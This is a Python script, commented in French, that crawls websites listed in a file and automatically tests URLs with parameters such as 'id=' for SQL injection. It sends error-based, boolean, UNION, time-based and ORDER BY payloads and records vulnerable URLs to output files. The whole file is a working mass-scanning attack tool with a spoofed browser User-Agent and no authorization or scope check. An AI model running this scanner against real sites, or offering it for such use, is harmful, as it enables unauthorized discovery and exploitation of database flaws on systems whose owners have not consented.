#!/usr/bin/env python3
"""
Crawler style Katana avec filtre d'URLs pour SQLi
Ne scanne que les URLs contenant "id=" ou autres paramètres SQLi potentiels
"""

import requests
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
import re
import time
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore, Style
from typing import Set, List, Dict, Any
import argparse
from datetime import datetime

init(autoreset=True)

class SQLiScanner:
    """Scanner SQLi spécialisé"""
    
    def __init__(self, timeout=10, delay=0.5):
        self.timeout = timeout
        self.delay = delay
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Payloads SQLi ciblés
        self.payloads = [
            ("1' OR '1'='1", "error_based"),
            ("1\" OR \"1\"=\"1", "error_based"),
            ("' OR 1=1--", "error_based"),
            ("1' AND '1'='1", "boolean_true"),
            ("1' AND '1'='2", "boolean_false"),
            ("' UNION SELECT NULL--", "union"),
            ("' UNION SELECT NULL,NULL--", "union"),
            ("' OR SLEEP(3)--", "time_based"),
            ("1' AND SLEEP(3)--", "time_based"),
            ("'; WAITFOR DELAY '00:00:03'--", "time_based"),
            ("' ORDER BY 100--", "order_by"),
            ("1' ORDER BY 100--", "order_by"),
        ]
        
        # Patterns d'erreur SQL
        self.error_patterns = [
            r"sql.*error|mysql_fetch|sqlite|postgresql|oracle|odbc",
            r"unclosed quotation mark|syntax error.*sql",
            r"warning:.*mysql|driver.*database",
            r"you have an error in your sql",
            r"division by zero.*sql",
            r"unknown column.*in.*where clause"
        ]
        
        self.vulnerabilities_found = []

    def url_has_parameters(self, url: str) -> bool:
        """Vérifie si l'URL a des paramètres potentiels pour SQLi"""
        parsed = urlparse(url)
        if not parsed.query:
            return False
        
        params = parse_qs(parsed.query)
        # Paramètres courants pour SQLi
        sql_params = ['id', 'page', 'cat', 'category', 'product', 'user', 
                     'username', 'email', 'search', 'q', 'query', 'sort', 
                     'order', 'filter', 'param', 'get', 'post', 'article']
        
        for param in params.keys():
            param_lower = param.lower()
            # Vérifie si le paramètre est dans la liste ou contient "id"
            if param_lower in sql_params or 'id' in param_lower:
                return True
        
        return False

    def test_single_url(self, url: str) -> Dict:
        """Teste une URL unique pour les vulnérabilités SQLi"""
        if not self.url_has_parameters(url):
            return {'url': url, 'vulnerable': False, 'reason': 'no_sql_params'}
        
        print(f"{Fore.YELLOW}[→] Test SQLi: {url}")
        
        parsed = urlparse(url)
        original_params = parse_qs(parsed.query)
        vulnerabilities = []
        
        for param_name, param_values in original_params.items():
            original_value = param_values[0]
            
            for payload, payload_type in self.payloads:
                try:
                    # Créer l'URL avec le payload
                    new_params = original_params.copy()
                    new_params[param_name] = [payload]
                    from urllib.parse import urlencode
                    new_query = urlencode(new_params, doseq=True)
                    test_url = parsed._replace(query=new_query).geturl()
                    
                    # Mesurer le temps pour time-based
                    start_time = time.time()
                    response = self.session.get(test_url, timeout=self.timeout)
                    response_time = time.time() - start_time
                    
                    # Analyse de la réponse
                    content = response.text.lower()
                    
                    # 1. Détection par erreur SQL
                    for pattern in self.error_patterns:
                        if re.search(pattern, content, re.IGNORECASE):
                            vuln = {
                                'url': url,
                                'vulnerable_url': test_url,
                                'param': param_name,
                                'payload': payload,
                                'type': 'error_based',
                                'evidence': pattern,
                                'status_code': response.status_code
                            }
                            vulnerabilities.append(vuln)
                            self.vulnerabilities_found.append(vuln)
                            print(f"{Fore.RED}[!] SQLi trouvée! {test_url}")
                            break
                    
                    # 2. Détection time-based
                    if payload_type == 'time_based' and response_time > 2.5:
                        # Vérification avec requête normale
                        normal_response_time = self._get_response_time(url)
                        if response_time > normal_response_time * 2:
                            vuln = {
                                'url': url,
                                'vulnerable_url': test_url,
                                'param': param_name,
                                'payload': payload,
                                'type': 'time_based',
                                'response_time': response_time,
                                'normal_time': normal_response_time,
                                'status_code': response.status_code
                            }
                            vulnerabilities.append(vuln)
                            self.vulnerabilities_found.append(vuln)
                            print(f"{Fore.RED}[!] SQLi Time-based! {test_url}")
                    
                    time.sleep(self.delay)
                    
                except Exception as e:
                    continue
        
        return {
            'url': url,
            'vulnerable': len(vulnerabilities) > 0,
            'vulnerabilities': vulnerabilities,
            'params_tested': list(original_params.keys())
        }

    def _get_response_time(self, url: str) -> float:
        """Mesure le temps de réponse normal"""
        try:
            start = time.time()
            self.session.get(url, timeout=5)
            return time.time() - start
        except:
            return 1.0

class KatanaCrawler:
    """Crawler qui filtre les URLs pour SQLi"""
    
    def __init__(self, urls_file: str, max_depth: int = 2, concurrency: int = 5):
        self.urls_file = urls_file
        self.max_depth = max_depth
        self.concurrency = concurrency
        
        self.visited: Set[str] = set()
        self.urls_to_scan: List[Dict] = []  # URLs avec paramètres à scanner
        self.all_discovered: List[str] = []  # Toutes les URLs découvertes
        self.sql_results: List[Dict] = []
        
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        self.scanner = SQLiScanner()

    def load_target_urls(self) -> List[str]:
        """Charge les URLs depuis le fichier"""
        try:
            with open(self.urls_file, 'r', encoding='utf-8') as f:
                urls = [line.strip() for line in f if line.strip()]
            print(f"{Fore.GREEN}[✓] {len(urls)} URLs chargées depuis {self.urls_file}")
            return urls
        except Exception as e:
            print(f"{Fore.RED}[✗] Erreur chargement fichier: {e}")
            return []

    def crawl_site(self, url: str, current_depth: int = 0):
        """Crawle un site pour trouver toutes les URLs"""
        if url in self.visited or current_depth > self.max_depth:
            return
        
        print(f"{Fore.CYAN}[*] Crawl [{current_depth}/{self.max_depth}]: {url}")
        
        try:
            response = self.session.get(url, timeout=10)
            self.visited.add(url)
            self.all_discovered.append(url)
            
            # Vérifier si l'URL a des paramètres SQLi potentiels
            if self.scanner.url_has_parameters(url):
                self.urls_to_scan.append({
                    'url': url,
                    'depth': current_depth,
                    'found_on': url
                })
                print(f"{Fore.GREEN}[+] URL avec paramètres: {url}")
            
            # Extraire les liens pour continuer le crawl
            if current_depth < self.max_depth:
                soup = BeautifulSoup(response.text, 'html.parser')
                for link in soup.find_all('a', href=True):
                    full_url = urljoin(url, link['href'])
                    # Garder dans le même domaine
                    if urlparse(full_url).netloc == urlparse(url).netloc:
                        if full_url not in self.visited:
                            self.crawl_site(full_url, current_depth + 1)
                            
        except Exception as e:
            print(f"{Fore.YELLOW}[-] Erreur crawl {url}: {str(e)[:50]}")

    def scan_urls_for_sqli(self):
        """Scanne uniquement les URLs avec paramètres"""
        if not self.urls_to_scan:
            print(f"{Fore.YELLOW}[!] Aucune URL avec paramètres à scanner")
            return
        
        print(f"\n{Fore.MAGENTA}{'='*60}")
        print(f"Scan SQLi sur {len(self.urls_to_scan)} URLs")
        print(f"{'='*60}{Style.RESET_ALL}\n")
        
        with ThreadPoolExecutor(max_workers=self.concurrency) as executor:
            futures = {
                executor.submit(self.scanner.test_single_url, item['url']): item 
                for item in self.urls_to_scan
            }
            
            for future in as_completed(futures):
                result = future.result()
                if result['vulnerable']:
                    self.sql_results.extend(result['vulnerabilities'])

    def run(self):
        """Exécute le crawl puis le scan"""
        # Phase 1: Charger les URLs de départ
        start_urls = self.load_target_urls()
        
        # Phase 2: Crawler chaque site
        print(f"\n{Fore.MAGENTA}Phase 1: Crawling des sites{Style.RESET_ALL}")
        for url in start_urls:
            print(f"\n{Fore.CYAN}--- Crawling: {url} ---")
            self.crawl_site(url)
        
        # Phase 3: Scanner les URLs avec paramètres
        print(f"\n{Fore.MAGENTA}Phase 2: Scan SQLi des URLs avec paramètres{Style.RESET_ALL}")
        self.scan_urls_for_sqli()
        
        # Phase 4: Sauvegarder les résultats
        self.save_results()

    def save_results(self, output_file: str = "sqli_results.json"):
        """Sauvegarde les résultats"""
        # Filtrer les URLs avec id= pour le rapport
        urls_with_id = [
            url for url in self.all_discovered 
            if re.search(r'[?&]id=', url, re.IGNORECASE)
        ]
        
        data = {
            'scan_info': {
                'date': datetime.now().isoformat(),
                'urls_initiales': len(self.load_target_urls()),
                'urls_decouvertes': len(self.all_discovered),
                'urls_avec_parametres': len(self.urls_to_scan),
                'urls_avec_id': len(urls_with_id),
                'vulnerabilites_trouvees': len(self.sql_results)
            },
            'urls_avec_parametres': [
                {'url': item['url'], 'depth': item['depth']} 
                for item in self.urls_to_scan
            ],
            'urls_contenant_id': urls_with_id,
            'vulnerabilites_sqli': self.sql_results
        }
        
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        
        # Aussi un fichier texte simple avec les URLs vulnérables
        if self.sql_results:
            with open("vulnerable_urls.txt", 'w') as f:
                for v in self.sql_results:
                    f.write(f"{v.get('vulnerable_url', v['url'])}\n")
        
        print(f"\n{Fore.GREEN}{'='*60}")
        print(f"RÉSULTATS FINAUX")
        print(f"{'='*60}")
        print(f"URLs découvertes: {len(self.all_discovered)}")
        print(f"URLs avec paramètres: {len(self.urls_to_scan)}")
        print(f"URLs contenant 'id=': {len(urls_with_id)}")
        print(f"Vulnérabilités SQLi trouvées: {len(self.sql_results)}")
        print(f"{'='*60}")
        print(f"Rapport détaillé: {output_file}")
        print(f"URLs vulnérables: vulnerable_urls.txt")

def main():
    parser = argparse.ArgumentParser(description='Katana crawler + SQLi scanner (filtre id=)')
    parser.add_argument('-l', '--list', required=True, help='Fichier contenant les URLs de départ')
    parser.add_argument('-d', '--depth', type=int, default=2, help='Profondeur de crawl (défaut: 2)')
    parser.add_argument('-c', '--concurrency', type=int, default=5, help='Concurrence (défaut: 5)')
    parser.add_argument('-o', '--output', default='sqli_results.json', help='Fichier de sortie')
    
    args = parser.parse_args()
    
    print(f"{Fore.MAGENTA}{'='*60}")
    print(" Katana-style Crawler + SQLi Scanner")
    print(" Ne scanne que les URLs avec paramètres (id=, etc.)")
    print(f"{'='*60}{Style.RESET_ALL}")
    
    crawler = KatanaCrawler(
        urls_file=args.list,
        max_depth=args.depth,
        concurrency=args.concurrency
    )
    
    try:
        crawler.run()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrompu par l'utilisateur")
        crawler.save_results(args.output)

if __name__ == "__main__":
    main()